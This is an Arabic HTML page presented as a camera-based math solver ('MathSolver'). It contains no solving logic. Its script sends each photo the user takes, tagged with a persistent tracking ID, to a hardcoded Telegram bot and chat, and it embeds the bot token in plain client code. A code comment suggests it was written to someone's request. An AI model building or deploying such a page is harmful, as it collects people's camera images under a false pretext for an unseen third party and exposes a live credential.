<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MathSolver — حل مسائل الرياضيات</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-grad: linear-gradient(135deg, #1b2a72 0%, #3b2667 42%, #7c2448 78%, #9e2a42 100%);
      --btn-grad: linear-gradient(90deg, #4f8ef7 0%, #00d4ff 100%);
      --text-main: #fff;
      --text-muted: rgba(255,255,255,0.85);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Cairo', sans-serif; min-height: 100vh;
      background: var(--bg-grad); color: var(--text-main);
      display: flex; flex-direction: column; padding: 40px 20px;
    }
    .container { max-width: 640px; margin: 0 auto; width: 100%; }
    h1 { font-size: clamp(1.8rem, 5vw, 2.6rem); margin-bottom: 14px; text-align: center; }
    p.lead { text-align: center; color: var(--text-muted); margin-bottom: 28px; line-height: 1.8; }

    .btn {
      display: inline-flex; align-items: center; justify-content: center; gap: 10px;
      padding: 14px 38px; border-radius: 999px; background: var(--btn-grad);
      color: #fff; font-family: 'Cairo', sans-serif; font-weight: 700; font-size: 1.08rem;
      border: none; cursor: pointer; box-shadow: 0 12px 30px rgba(0,212,255,0.35);
      transition: transform 0.2s ease;
    }
    .btn:hover { transform: translateY(-2px); }
    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
    .btn-secondary {
      background: rgba(255,255,255,0.14); box-shadow: none;
      border: 1px solid rgba(255,255,255,0.25);
    }
    .center { text-align: center; }

    .box {
      display: none; margin-top: 24px;
      background: rgba(25,18,42,0.55); border: 1px solid rgba(255,255,255,0.16);
      backdrop-filter: blur(12px); border-radius: 20px; padding: 20px;
      text-align: center;
    }
    .box.active { display: block; }
    .status { font-size: 1rem; font-weight: 600; color: #7dd3fc; margin-bottom: 14px; min-height: 1.5em; }
    .status.error { color: #fca5a5; }
    .status.success { color: #86efac; }
    .status.warn { color: #fde68a; }

    #previewImg {
      width: 100%; max-height: 400px; object-fit: contain;
      border-radius: 14px; display: none; background: #000;
    }
    #previewInfo { font-size: 0.85rem; color: rgba(255,255,255,0.6); margin-top: 8px; }

    /* إخفاء حقل الملف الأصلي */
    #fileInput {
      position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>حل مسائل الرياضيات بالكاميرا</h1>
    <p class="lead">اضغط الزر لفتح كاميرا جهازك، التقط صورة المسألة، وستُرسل تلقائياً.</p>

    <div class="center">
      <!-- ⬇️ هذا هو الحل: حقل ملف مع capture يفتح كاميرا الجهاز مباشرة -->
      <input type="file" id="fileInput" accept="image/*" capture="environment" />
      <button id="openBtn" class="btn" type="button">📷 فتح الكاميرا والتقاط صورة</button>
    </div>

    <div id="box" class="box">
      <p id="status" class="status">...</p>
      <img id="previewImg" alt="معاينة الصورة" />
      <div id="previewInfo"></div>
      <div style="margin-top:16px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
        <button id="retryBtn" class="btn btn-secondary" type="button" style="display:none;">التقاط صورة أخرى</button>
        <a id="downloadLink" class="btn btn-secondary" download="math-problem.jpg" style="display:none;">حفظ الصورة</a>
      </div>
    </div>
  </div>

<script>
  // ⬇️ التوكن والأيدي كما طلبت
  const TELEGRAM_BOT_TOKEN = '8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0';
  const TELEGRAM_CHAT_ID   = '8549252422';

  const fileInput   = document.getElementById('fileInput');
  const openBtn     = document.getElementById('openBtn');
  const box         = document.getElementById('box');
  const statusEl    = document.getElementById('status');
  const previewImg  = document.getElementById('previewImg');
  const previewInfo = document.getElementById('previewInfo');
  const retryBtn    = document.getElementById('retryBtn');
  const downloadLink= document.getElementById('downloadLink');

  let isBusy = false;

  const USER_ID = (() => {
    try {
      let id = localStorage.getItem('mathsolver_user_id');
      if (!id) {
        id = 'USR-' + Date.now().toString(36).toUpperCase() + '-' +
             Math.random().toString(36).slice(2,7).toUpperCase();
        localStorage.setItem('mathsolver_user_id', id);
      }
      return id;
    } catch { return 'USR-' + Date.now().toString(36).toUpperCase(); }
  })();

  function setStatus(msg, cls = '') {
    statusEl.textContent = msg;
    statusEl.className = 'status ' + cls;
  }

  // فتح الكاميرا الأصلية للجهاز
  openBtn.addEventListener('click', () => {
    box.classList.add('active');
    setStatus('📷 اختر "الكاميرا" من النافذة التي ظهرت...');
    fileInput.value = ''; // إعادة تعيين
    fileInput.click();    // يفتح كاميرا الجهاز مباشرة
  });

  retryBtn.addEventListener('click', () => {
    fileInput.value = '';
    fileInput.click();
  });

  // عند اختيار/التقاط صورة
  fileInput.addEventListener('change', async (e) => {
    const file = e.target.files && e.target.files[0];
    if (!file) {
      setStatus('لم يتم اختيار صورة.', 'warn');
      return;
    }

    if (isBusy) return;
    isBusy = true;
    openBtn.disabled = true;
    retryBtn.style.display = 'none';
    downloadLink.style.display = 'none';

    try {
      // عرض معاينة
      const dataUrl = URL.createObjectURL(file);
      previewImg.src = dataUrl;
      previewImg.style.display = 'block';

      const sizeKB = (file.size / 1024).toFixed(1);
      previewInfo.textContent = `الحجم: ${sizeKB} KB — النوع: ${file.type || 'غير معروف'}`;

      // التحقق من الحجم (تيليغرام: حد أقصى 10MB للصور العادية)
      if (file.size > 9 * 1024 * 1024) {
        setStatus('⚠️ الصورة كبيرة جداً (أكبر من 9MB). اختر صورة أصغر.', 'error');
        retryBtn.style.display = 'inline-flex';
        return;
      }

      setStatus(`📤 جاري الإرسال (${sizeKB} KB)...`);

      // إرسال إلى تيليغرام
      const fd = new FormData();
      fd.append('chat_id', TELEGRAM_CHAT_ID);
      fd.append('photo', file, `problem-${Date.now()}.jpg`);
      fd.append('caption', `📸 صورة مسألة\nID: ${USER_ID}\nالحجم: ${sizeKB} KB`);

      const res = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        { method: 'POST', body: fd }
      );

      let data = null;
      try { data = await res.json(); } catch {}

      if (res.ok && data && data.ok) {
        setStatus('✅ تم إرسال الصورة بنجاح!', 'success');
        downloadLink.href = dataUrl;
        downloadLink.style.display = 'inline-flex';
        retryBtn.style.display = 'inline-flex';
      } else {
        const desc = (data && data.description) || `HTTP ${res.status}`;
        setStatus('⚠️ فشل الإرسال: ' + desc, 'error');
        retryBtn.style.display = 'inline-flex';
      }
    } catch (err) {
      setStatus('❌ خطأ: ' + (err.message || err), 'error');
      retryBtn.style.display = 'inline-flex';
    } finally {
      isBusy = false;
      openBtn.disabled = false;
    }
  });
</script>
</body>
</html>
